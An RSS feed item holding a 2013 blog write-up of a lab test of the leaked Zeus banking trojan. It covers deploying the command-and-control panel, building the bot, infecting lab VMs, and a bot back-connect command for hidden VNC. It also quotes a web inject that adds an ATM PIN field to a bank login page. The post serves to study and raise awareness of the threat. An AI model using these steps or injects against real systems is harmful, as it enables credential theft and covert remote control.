<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bot on #!/slash/note</title>
    <link>https://leonjza.github.io/categories/bot/</link>
    <description>Recent content in Bot on #!/slash/note</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 23 Sep 2013 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://leonjza.github.io/categories/bot/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Zeus My Adventure with a Infamous Bot</title>
      <link>https://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/</link>
      <pubDate>Mon, 23 Sep 2013 00:00:00 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&#34;bots-for-the-masses&#34;&gt;Bots for the masses.&lt;/h3&gt;

&lt;p&gt;Recently at a conference that I attended, I sat in a class that was talking about Botnets and general &amp;lsquo;How Easy They Are&amp;rsquo; related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not &lt;strong&gt;100%&lt;/strong&gt; aware of how ( and I dare say this lightly ) &lt;em&gt;easy&lt;/em&gt; they have it. The technical competency of the adversary really doesn&amp;rsquo;t have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator.&lt;/p&gt;

&lt;h3 id=&#34;so-botnet&#34;&gt;So, botnet?&lt;/h3&gt;

&lt;p&gt;In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the [Zeus botnet](&lt;a href=&#34;https://en.wikipedia.org/wiki/Zeus_(malware)&#34;&gt;https://en.wikipedia.org/wiki/Zeus_(malware)&lt;/a&gt;). Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra &lt;em&gt;features&lt;/em&gt; that you&amp;rsquo;d like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.&lt;/p&gt;

&lt;p&gt;So for $700, you can buy a relatively easy to setup piece of software that would allow you to &lt;em&gt;steal&lt;/em&gt; credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article [here](&lt;a href=&#34;https://en.wikipedia.org/wiki/Zeus_(malware)&#34;&gt;https://en.wikipedia.org/wiki/Zeus_(malware)&lt;/a&gt;) does a excellent job to describe the process in a image:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_fraud_scheme.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h3 id=&#34;the-zeus-bot-architecture&#34;&gt;The Zeus Bot Architecture&lt;/h3&gt;

&lt;p&gt;The Zeus bot client side software is a windows only piece of malware. Typically infection would occur via a &lt;a href=&#34;http://en.wikipedia.org/wiki/Drive-by_download&#34;&gt;drive-by download&lt;/a&gt; (which is the scariest and possibly most stealthy form of infection), or via other means such as facebook posts, phishing sites etc, enticing the user to run an arbitrary executable. Of course, infection is not limited to these methods. Simply getting access to a computer, plugging in your thumbdrive and running the bot software is a completely valid form of infection.&lt;/p&gt;

&lt;p&gt;Once infection is successful, the client runs silently on the victim PC, masking itself as much as possible. The client would have a time configured that tells it how often it should update the Command and Control server with new collected information, as well as dynamic configuration updates, new commands it should run and keep-alive check-ins.&lt;/p&gt;

&lt;h3 id=&#34;zeus-source-leaked&#34;&gt;Zeus Source Leaked&lt;/h3&gt;

&lt;p&gt;The full Zeus bot sources &lt;a href=&#34;https://www.csis.dk/en/csis/blog/3229/&#34;&gt;leaked&lt;/a&gt; around March 2011, and a Github repo of it was made &lt;a href=&#34;https://github.com/Visgean/Zeus&#34;&gt;here&lt;/a&gt;. This allowed any one in the public to dissect, inspect and test the Malware. This was probably not a good thing for the malware authors&amp;rsquo; business :). However, now, anyone is able to grab the sources, modify it as required and use. It leads to the possibility of even more sophistication in a already successful botnet, such as adding peer-to-peer communications with C&amp;amp;C servers instead of relying on HTTP as can be seen in &lt;a href=&#34;http://www.cert.pl/PDF/2013-06-p2p-rap_en.pdf&#34;&gt;this&lt;/a&gt; excellent analysis by &lt;a href=&#34;https://twitter.com/CERT_Polska_en&#34;&gt;@CERT_Polska_en&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&#34;lab-time&#34;&gt;LAB Time!&lt;/h3&gt;

&lt;p&gt;Now that we have the full sources, I decided it&amp;rsquo;s time to setup a LAB to configure and play with this bot.&lt;/p&gt;

&lt;p&gt;I have a KVM Server at my disposal, and figured it will be a good idea to use that. The basic idea of the lab was to have a simulated internet network, a firewall, and a client network that makes use of this &amp;ldquo;Fake Internet&amp;rdquo;. I created 2 isolated networks, configured a set of CentOS 6, and Windows XP clients and a Server 2008 R2 Server.&lt;/p&gt;

&lt;p&gt;In short, the lab was going to look something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;
                         Virtual Machine Management Interface
                         +-----------------------------------&amp;gt;
                                   |
                                   |
                                   |
                              +----+---------+
                              |              |
                  +-----------+  Firewall    +-----------+
                  |           |              |           |
                  |           +--------------+           |
                  |                                      |                 +----------+
                  |                  ^                   |              +--| Victim A |
          +---------------+          |           +----------------+     |  +----------+
          |               |          |           |                |     |
          | Fake Internet |          +           |   Fake LAN     +-----+  +----------+
          |               |                      |                |     +--+ Victim B |
          +------+--------+   NAT Towards Fake   +----------------+        +----------+
                 |            Internet Interface
                 |
        +--------+--------+--------------------+----------------+
        |                 |                    |                |
        |                 |                    |                |
        |                 |                    |                +
 +------+-----+     +-----+------+      +------+-------+     +-----------------+
 |            |     |            |      |              |     |                 |
 | Zeus Bot   |     | Zeus Web   |      | Random Victim|     | Compromised     |
 | Herder /   |     | based C&amp;amp;C  |      |              |     | Web Server      |
 | Controller |     |            |      |              |     |                 |
 +------------+     +------------+      +--------------+     +-----------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;the-configuration&#34;&gt;The Configuration&lt;/h3&gt;

&lt;h4 id=&#34;command-control&#34;&gt;Command &amp;amp; Control&lt;/h4&gt;

&lt;p&gt;I figured I&amp;rsquo;d start by checking out the code from the &lt;a href=&#34;https://github.com/Visgean/Zeus/&#34;&gt;git&lt;/a&gt; repo onto the server I would use as the command and control server. So, off I went and &lt;code&gt;git clone https://github.com/Visgean/Zeus.git&lt;/code&gt;&amp;rsquo;d the Zeus code into a local directory of my C&amp;amp;C server.&lt;/p&gt;

&lt;p&gt;The folder structure of the directory &lt;code&gt;output&lt;/code&gt; that is of interest, on disk, looked something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Zeus/output
├── builder
├── other
├── server
└── server[php]
    ├── install
    ├── system
    └── theme
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see there is a &lt;code&gt;server[php]&lt;/code&gt; directory, which is rather obvious that this is the web interface code. Quick inspection of the sources revealed that the common directory index &lt;code&gt;index.php&lt;/code&gt; is in fact empty. So, should someone stumble upon the C&amp;amp;C directory, a blank page will be displayed to the user.&lt;/p&gt;

&lt;p&gt;Two other files also exist in the php server root, namely &lt;code&gt;cp.php&lt;/code&gt; and &lt;code&gt;gate.php&lt;/code&gt;. &lt;code&gt;cp.php&lt;/code&gt; is the user control panel to manage the bots, whereas &lt;code&gt;gate.php&lt;/code&gt; is the script that all the bots will use to communicate with the C&amp;amp;C. That being said, inspecting network traffic should reveal a lot of talking with &lt;code&gt;gate.php&lt;/code&gt;. As a side note, the comments in the sources are in Russian, which makes for a interesting time with Google Translate to read them ;)&lt;/p&gt;

&lt;p&gt;So, I copied the sources for &lt;code&gt;server[php]&lt;/code&gt; to a web folder &lt;code&gt;z/&lt;/code&gt;, fixed up the SELinux contexts for them and tried to access the &lt;code&gt;cp.php&lt;/code&gt; page. Bam, server error.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Zeus cp.php mb_internal_encoding error
[Mon Sep 23 10:57:45 2013] [error] [client 172.16.50.1] PHP Fatal error:  Call to undefined function mb_internal_encoding() in /var/www/html/z/system/global.php on line 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It was pretty obvious I was missing &lt;code&gt;php-mbstring&lt;/code&gt;, so I went and installed it and restarted Apache. Now, loading my &lt;code&gt;cp.php&lt;/code&gt;, I was greeted with a polite message asking me how I am :D&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_cp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h4 id=&#34;installing-the-command-control&#34;&gt;Installing the Command &amp;amp; Control&lt;/h4&gt;

&lt;p&gt;I noticed a install folder in the obtained sources and browsed to &lt;code&gt;install/&lt;/code&gt; and found a very nice, easy to understand installer:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_cp_install.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database &lt;code&gt;cpdb&lt;/code&gt; for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_cp_internal.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h4 id=&#34;compiling-the-bot&#34;&gt;Compiling the Bot&lt;/h4&gt;

&lt;p&gt;With that out of the way, the next step had to be to compile the Zeus bot binary with which we will be infecting the Lab of fake LAN clients. For this a Windows machine was required as the tools for this are all windows based. I fired up a Windows XP Virtual Machine, and grabbed a copy of the Zeus code from the Github repository again.&lt;/p&gt;

&lt;p&gt;Next, I browsed to the &lt;code&gt;output/builder/&lt;/code&gt; folder again and opened the &lt;code&gt;config.txt&lt;/code&gt; file in notepad. Here, I really had to set minimal options. One to specify the location of the &lt;code&gt;config.bin&lt;/code&gt; and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the &lt;code&gt;encryption_key&lt;/code&gt;, which should correspond to the key used when we installed the server side PHP stuff earlier.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_compiler_config.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The next step was to &lt;em&gt;compile&lt;/em&gt; the bot. While this may sound complex, it&amp;rsquo;s not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The &lt;strong&gt;compiler&lt;/strong&gt; interface looked like this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_bot_compiler.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;1,2,3 done. We now have a &lt;code&gt;zeus-bot.exe&lt;/code&gt;. The malware is now customized to speak to my Command &amp;amp; Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.&lt;/p&gt;

&lt;h3 id=&#34;skipping-the-creative-parts-infection&#34;&gt;Skipping the creative parts - Infection.&lt;/h3&gt;

&lt;p&gt;From here the infection phase pretty much starts. Of course, the bot herder would need to test hes executables and ensure that they are in working order. There is no point in distributing malware that doesn&amp;rsquo;t work eh. ;D With infection, as previously mentioned anything goes. From drive-by downloads to phishing to physical access to a server. If the machine can execute the bot executable, its job done.&lt;/p&gt;

&lt;p&gt;Sadly, I wanted to test the &lt;a href=&#34;http://en.wikipedia.org/wiki/Blackhole_exploit_kit&#34;&gt;Blackhole Exploit Kit&lt;/a&gt;, but the resources on the net appear to be rather scarce. That and the fact that the available versions of it are encoded using a PHP encoder (IonCube), makes it a tad more difficult to get going. It was however interesting to see that the malware authors are limiting they software to IP&amp;rsquo;s along with time restrictions the works. Just like something you&amp;rsquo;d expect to see in commercial software.&lt;/p&gt;

&lt;p&gt;As I am kind of the only person using this network, there is no point in trying to fool me into getting the executable run. To make it easy for me to rerun it, I uploaded &lt;code&gt;zeus-bot.exe&lt;/code&gt; and the encrypted &lt;code&gt;config.bin&lt;/code&gt; to a fake &lt;strong&gt;compromised web server&lt;/strong&gt;, ready for download.&lt;/p&gt;

&lt;p&gt;I opened Internet Explorer and browsed to the location of &lt;code&gt;zeus-bot.exe&lt;/code&gt; and chose &lt;strong&gt;RUN&lt;/strong&gt;. To the unsuspecting user, it will appear that nothing happened&amp;hellip;&lt;/p&gt;

&lt;h3 id=&#34;from-the-bot-herders-perspective&#34;&gt;From the Bot Herders Perspective&lt;/h3&gt;

&lt;p&gt;Assuming the position of the evil bot herder now, I am able to see that I have a new bot connected to my Command &amp;amp; Control server. We can see this in the interface, as well as based on the POST requests to &lt;code&gt;gate.php&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Apache Logs Extract for POST&#39;s to gate.php
172.16.50.2 - - [19/Sep/2013:10:58:01 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:58:06 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:58:12 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:58:17 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:58:22 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:00 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:05 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:10 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:15 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:20 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:23 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:28 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:34 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:39 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:10:59:44 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:00:20 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:00:25 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:00:30 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:00:35 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:00:40 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:00:45 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:00:50 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:00:56 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:01:01 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:01:07 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:01:40 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:01:45 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:01:50 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
172.16.50.2 - - [19/Sep/2013:11:01:55 -0400] &amp;quot;POST /z/gate.php HTTP/1.1&amp;quot; 200 - &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We are also able to, using the control panel, see some more information based on the newly connected bot:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_bot_zombie.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command &amp;amp; Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an &lt;em&gt;almost live&lt;/em&gt; image. On the client, we can see that the process &lt;code&gt;explorer.exe&lt;/code&gt; is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_bot_listener_port.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.&lt;/p&gt;

&lt;p&gt;So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command &amp;amp; Control server &lt;strong&gt;will&lt;/strong&gt; be able to connect to. The result?&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_bot_screenshot.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;There is &lt;strong&gt;no&lt;/strong&gt; visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.&lt;/p&gt;

&lt;h4 id=&#34;but-thats-not-all&#34;&gt;But thats not all&lt;/h4&gt;

&lt;p&gt;Just being able to &lt;em&gt;see&lt;/em&gt; what the user sees is not really enough. No. You also have the ability to remotely VNC into the infected machine. By doing this, the attacker is able to remotely control your computer as you, with one difference, you won&amp;rsquo;t know about it. So lets say he managed to successfully compromise your banking credentials. Instead of triggering alarms on the banks side that a login has just occurred on the other side of the globe, the attacker can now use &lt;strong&gt;your&lt;/strong&gt; machine to steal &lt;strong&gt;your&lt;/strong&gt; money. From the banks perspective this may appear like a perfectly legitimate transaction.&lt;/p&gt;

&lt;p&gt;So lets see how this VNC functionality works.&lt;/p&gt;

&lt;h4 id=&#34;execute-the-vnc-bc-script&#34;&gt;Execute the VNC BC Script&lt;/h4&gt;

&lt;p&gt;First, the attacker will have to prepare a back connect server and then, via a script, tell the bot to connect to this server so that he may access the botted machine. This architecture is pretty solid. The only thing really that would stop an attacker from succeeding in setting up this back connect is if the remote firewall was to block the port that the attacker has set up on the back connect server. However, things like port 80, or even 443 is almost always opened, so these will be prime candidates to use.&lt;/p&gt;

&lt;p&gt;In short, the setup will look something like this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;   --------------------------&amp;gt;        &amp;lt;--------------------------------------------
   --------------------------&amp;gt;        &amp;lt;--------------------------------------------

   +------------+      +-----------------------+  +--------------+   +------------------+
   |  Attacker  +------&amp;gt;  Back Connect Server  &amp;lt;--+ LAN Firewall &amp;lt;---+ Infected Machine |
   +------------+      +-----------------------+  +--------------+   +------------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The back connect server could be any host the attacker has access to and controls. This is also a great way for the attacker that wants to VNC to hide hes IP information. Should you on the infected machine realize what is going on, then you&amp;rsquo;d only see the connection going out to the back connect server, and not the real attacker. The server executable is &lt;code&gt;zsbcs.exe&lt;/code&gt; in the &lt;code&gt;output/server/&lt;/code&gt; directory and is a windows only tool.&lt;/p&gt;

&lt;p&gt;Once the Back Connect Server is setup to listen on one port for new bots, and another for VNC client connections, the attacker would configure a script, instructing the clients where to connect. The script would look something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bot_bc_add vnc 172.16.50.181 9000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This tells the bot where to connect to wait for a VNC session.&lt;/p&gt;

&lt;p&gt;Next, the attacker can sit and watch hes Back Connect Server&amp;rsquo;s output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate &lt;strong&gt;display&lt;/strong&gt;, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It&amp;rsquo;s almost as if hes attaching to another &lt;em&gt;tty&lt;/em&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_back_connect_vnc.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h3 id=&#34;web-injects-the-real-threat&#34;&gt;Web Injects, the real threat.&lt;/h3&gt;

&lt;p&gt;So all of this Remote Administration Stuff is cool. No doubt they are useful tools for an attacker, but this is not what has made Zeus what it is known for today. Zeus uses what is called &lt;strong&gt;Web Injects&lt;/strong&gt; to manipulate website content. &amp;ldquo;What do you mean by &amp;lsquo;manipulation&amp;rsquo;?&amp;rdquo; you may ask. Well, lets assume you are about to buy something online. Generally, the store would ask you for a Credit Card number and an expiry. Usually, on the next page you may be asked for the CVV number. With your machine infected with Zeus, the attacker is able to ask for your Credit Card Number, Expiry, CVV, Email Address, Address, Tel no., secret question etc etc all on one page. The page itself will look totally legit, and again, to the unsuspecting user, this may seem completely normal and away he goes entering hes details. Once submitted, Zeus captures the entire request, including the cookies, the POST data etc etc and based on the bots timer configurations, uploads this information to the Command &amp;amp; Control server. Just like the one we just used to Remotely Administer the infected machines.&lt;/p&gt;

&lt;p&gt;With all this information, he may be able to return at a later stage, VNC to your computer and access your account to buy himself some new toys. Because he managed to get hold of your secret question, he finds no trouble in complying to any potential security checks the portal may bring.&lt;/p&gt;

&lt;h4 id=&#34;how-it-works&#34;&gt;How it works&lt;/h4&gt;

&lt;p&gt;When looking at the web injects, I guess the simplest way to describe them is similar to your favorite text editors search and replace features. With the Zeus bot hooked into some low level network API&amp;rsquo;s in Windows, it is able to monitor for its configured URL&amp;rsquo;s, and inject arbitrary content into the responses that are displayed in your browser. Lets take an example from the source &lt;a href=&#34;https://github.com/Visgean/Zeus/blob/translation/output/builder/webinjects.txt#L63&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;set_url https://www.wellsfargo.com/* G
data_before
&amp;lt;span class=&amp;quot;mozcloak&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;password&amp;quot;*&amp;lt;/span&amp;gt;
data_end
data_inject
&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;label for=&amp;quot;atmpin&amp;quot;&amp;gt;ATM PIN&amp;lt;/label&amp;gt;:&amp;lt;/strong&amp;gt;&amp;amp;nbsp;&amp;lt;br /&amp;gt;
&amp;lt;span class=&amp;quot;mozcloak&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;password&amp;quot; accesskey=&amp;quot;A&amp;quot; id=&amp;quot;atmpin&amp;quot; name=&amp;quot;USpass&amp;quot; size=&amp;quot;13&amp;quot; maxlength=&amp;quot;14&amp;quot; style=&amp;quot;width:147px&amp;quot; tabindex=&amp;quot;2&amp;quot; /&amp;gt;&amp;lt;/span&amp;gt;
data_end
data_after
data_end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the above extract from the web injects we can see that the http&lt;strong&gt;s&lt;/strong&gt;://wellsfargo.com (note the s) website will have a extra field added, asking for a &lt;em&gt;ATM PIN&lt;/em&gt; before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&amp;amp;C.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/zues_web_inject_examples.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h3 id=&#34;summary&#34;&gt;Summary&lt;/h3&gt;

&lt;p&gt;While Zeus itself is old news and many variants such as &lt;a href=&#34;http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf&#34;&gt;Citadel&lt;/a&gt; have sprung up, I believe this is still a very valid threat as the concepts remain the same.&lt;/p&gt;

&lt;p&gt;A interesting thing about the bot. Zeus, once it infects a PC, will delete all the cookies in Internet Explorer. This is to force the user to re-login to the services he uses, and also lets Zeus grab them :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Jabber to Email using SleekXMPP</title>
      <link>https://leonjza.github.io/blog/2013/06/07/jabber-to-email-using-sleekxmpp/</link>
      <pubDate>Fri, 07 Jun 2013 00:00:00 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2013/06/07/jabber-to-email-using-sleekxmpp/</guid>
      <description>

